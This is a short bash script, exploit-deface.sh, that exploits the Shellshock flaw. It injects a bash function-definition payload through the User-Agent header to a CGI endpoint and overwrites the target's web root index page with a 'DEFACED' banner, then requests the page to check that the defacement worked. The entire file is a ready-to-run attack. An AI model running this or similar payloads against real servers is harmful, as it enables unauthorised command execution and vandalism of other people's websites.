#!/bin/bash

if [ -z "$1" ]
then
    echo 'Please inform the IP and PORT of the target'
    echo 'Example: ./exploit-deface.sh <ip> <port>'
    return -1
fi

if [ -z "$1" ]
then
    echo 'Please inform the IP and PORT of the target'
    echo 'Example: ./exploit-deface.sh <ip> <port>'
    return -1
fi

ip=$1
port=$2

echo '[+] Sending the exploit'
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>DEFACED</h1></body></html>\" > /var/www/index.html'" http://$ip:$port/cgi-bin/vulnerable && \
echo '[+] Target exploited, testing if defacement page is deployed' && \
curl http://$ip:$port
echo '[+] Done'
